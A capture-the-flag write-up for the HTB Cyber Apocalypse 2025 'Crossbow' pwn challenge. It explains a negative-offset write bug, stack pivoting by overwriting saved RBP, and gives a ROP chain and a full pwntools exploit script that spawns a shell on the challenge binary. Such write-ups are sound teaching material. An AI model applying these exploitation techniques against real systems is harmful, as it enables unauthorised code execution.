# HTB Cyber Apocalypse 2025 - Crossbow Writeup
**Date:** March 21, 2025
**Author:** s1gn3rs

## Challenge Information

- **Category:** PWN
- **Challenge Name:** Crossbow
- **Description:** Sir Alaric's legendary shot can pierce through any enemy! Join his training and hone your aim to match his unparalleled precision.
- **Author:** w3th4nds

### Binary Security Features

```
Permissions:
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

### Key Observations
- **Partial RELRO** The Global Offset Table (GOT) is writable, so entries can be overwritten.
- **Stack Canary:** We need to ensure we do not overwrite it incorrectly.
- **NX Enabled:** We cannot execute shellcode on the stack.
- **No PIE:** ASLR is off, so we can use fixed addresses in our ROP chain.

---

## Binary Analysis

### Binary functions (Decompiled via Binary Ninja)

```c
int64_t main()
{
    setvbuf(&__stdin_FILE, 0, 2, 0);
    setvbuf(&__stdout_FILE, 0, 2, 0);
    alarm(0x1312);
    banner();
    training();
    return 0;
}


uint64_t training()
{
    printf("%s\n[%sSir Alaric%s]: You only have 1 shot, don\'t miss!!\n" stetic, stetic, stetic);
    void stackVar;
    target_dummy(&stackVar);
    return printf("%s\n[%sSir Alaric%s]: That was quite a shot!!\n\n", stetic, stetic, stetic);
}


void* target_dummy(void* arg1)
{
    printf("%s\n[%sSir Alaric%s]: Select target to shoot: ", stetic, stetic, stetic);

    int32_t offset;

    if (__isoc99_scanf("%d%*c", &offset) != 1)
    {
        printf("%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n", stetic, stetic, stetic);
        exit(0x520);
        /* no return */
    }

    void** addr = ((int64_t)offset << 3) + arg1;
    *(uint64_t*)addr = calloc(1, 0x80);

    if (!*(uint64_t*)addr)
    {
        printf("%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n", stetic, stetic, stetic);
        exit(0x1b39);
        /* no return */
    }

    printf("%s\n[%sSir Alaric%s]: Give me yo…", stetic, stetic, stetic);
    void* result = fgets(*(uint64_t*)((char*)arg1 + ((int64_t)offset << 3)), 0x80);

    if (result)
        return result;

    printf("%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ", stetic, stetic, stetic);
    exit(0x45);
    /* no return */
}



```

### Important Findings
1. **training() passes a stack frame address:** It seems to pass the address of a local variable `(stackVar)` to `target_dummy()`, which gives us a reference point on the stack.
2. **Arbitrary offset:** There is no validation applied to the `offset` input, which means we can pass negative values since it's a signed variable.
3. **Writting to previous stack frames:** With negative offsets, it's possible to write to any prior address on the stack, including `saved return addresses`.
4. **Abundance of unused functions** This binary contains many unused functions. My first thought is that they might be useful for building a solid `ROP chain` by providing accessible gadgets.




## Where to Write?

One initial idea was to write directly to the **saved RSP**, but that approach doesn’t work.

With that we’d just be placing a pointer in a pointer to our data there, and since **NX (No eXecute)** is enabled, we can’t jump directly to shellcode. Instead, we’d need a valid **ROP chain**.

At the point of returning, the stack would look like this:

    RSP ──▶ [ memAllocatedByCalloc ] ──▶ [ addressOfGadget ]

So when `ret` executes, it would try to jump to a pointer, which isn't executable. This causes a crash.

---

### Better Approach: Overwrite `saved RBP`

A more effective strategy is to overwrite the **saved RBP** instead.

After the vulnerable function (e.g., `target_dummy`) returns, it executes:

    leave   ; (equivalent to mov rsp, rbp)
    ret     ; (pop RIP)

This means:
1. If we control the **saved RBP**, we control where `RSP` goes after `leave`.
2. Then after leaving `training():` is `leave; ret` will pop the next address from our fake stack — a clean **ROP chain**.

By setting `saved RBP` to point to a memory region we control (that one allocated by calloc), we pivot the stack and execute our payload safely, **without violating NX**.

---

This approach lets us chain gadgets and build a full ROP chain, leading to shell access or further control.
"""



## ROP Chain Creation

With `ropper`'s help, we created an `execve("/bin/sh", NULL, NULL)` ROP chain using gadgets inside the binary.

Here's the initial result:

```bash
└─$ ropper --file crossbow --chain execve

#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 7bf5f772c59b6cc7854de1212fa8c99ec9bf25e33a4b0cd6c251200852dd2c2b
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret; 
rop += '//bin/sh'
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret; 
rop += rebase_0(0x000000000000e000)
rop += rebase_0(0x00000000000020f5) # 0x00000000004020f5: mov qword ptr [rdi], rax; ret; 
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret; 
rop += rebase_0(0x000000000000e008)
rop += rebase_0(0x00000000000020f5) # 0x00000000004020f5: mov qword ptr [rdi], rax; ret; 
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret; 
rop += rebase_0(0x000000000000e000)
rop += rebase_0(0x000000000000566b) # 0x000000000040566b: pop rsi; ret; 
rop += rebase_0(0x000000000000e008)
rop += rebase_0(0x0000000000001139) # 0x0000000000401139: pop rdx; ret; 
rop += rebase_0(0x000000000000e008)
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000004b51) # 0x0000000000404b51: syscall; ret; 
print(rop)
```
However, there was one issue: we were limited to 0x80 bytes of input due to fgets, and this ROP chain was too large.
Thankfully, some registers were already set to helpful values when the chain was triggered:


```bash
Registers:
 RAX  0x3d
 RBX  1
 RCX  0x3d
 RDX  0
 RDI  0x3d
 RSI  0
 R8   0x1c
 R9   0x3d
 R10  7
 R11  0x202
 R12  0x4013ed (main) ◂— endbr64 
 R13  0x7fffffffdcf8 —▸ 0x7fffffffe0b6 ◂— 'COLORFGBG=15;0'
 R14  0
 R15  0
 RBP  0x7fffffffdca0 —▸ 0x7fffffffdce8 —▸ 0x7fffffffe061
 RSP  0x7fffffffdc98 —▸ 0x40144a (main+93) ◂— mov eax, 0
 RIP  0x4013ec (training+126) ◂— ret 
```

So the new ROP is this:

```bash
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 7bf5f772c59b6cc7854de1212fa8c99ec9bf25e33a4b0cd6c251200852dd2c2b
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret;
rop += b'//bin/sh'
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret;
rop += rebase_0(0x000000000000e000)
rop += rebase_0(0x00000000000020f5) # 0x00000000004020f5: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret;
rop += rebase_0(0x000000000000e008)
rop += rebase_0(0x00000000000020f5) # 0x00000000004020f5: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret;
rop += rebase_0(0x000000000000e000)
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000004b51) # 0x0000000000404b51: syscall; ret;
print(rop)
```


### Full exploit

```python
#!/usr/bin/env python3

from pwn import *
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 7bf5f772c59b6cc7854de1212fa8c99ec9bf25e33a4b0cd6c251200852dd2c2b
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret;
rop += b'//bin/sh'
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret;
rop += rebase_0(0x000000000000e000)
rop += rebase_0(0x00000000000020f5) # 0x00000000004020f5: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret;
rop += rebase_0(0x000000000000e008)
rop += rebase_0(0x00000000000020f5) # 0x00000000004020f5: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x0000000000001d6c) # 0x0000000000401d6c: pop rdi; ret;
rop += rebase_0(0x000000000000e000)
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000004b51) # 0x0000000000404b51: syscall; ret;
print(rop)




e = ELF("crossbow_patched")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b* target_dummy
            b* target_dummy+89
            b* target_dummy+430
            b* training+126
            c
            c
            """)
    elif cond == 3:
        r = remote("94.237.55.96", 58025)

    return r



def main():
    r = conn(2)
    print(hex(len(rop)))
    print(hex(e.bss()))
    r.sendline(b"-2")
    r.sendline(b"/bin/sh\x00" + rop)

    r.clean()
    r.interactive()

if __name__ == "__main__":
    main()
```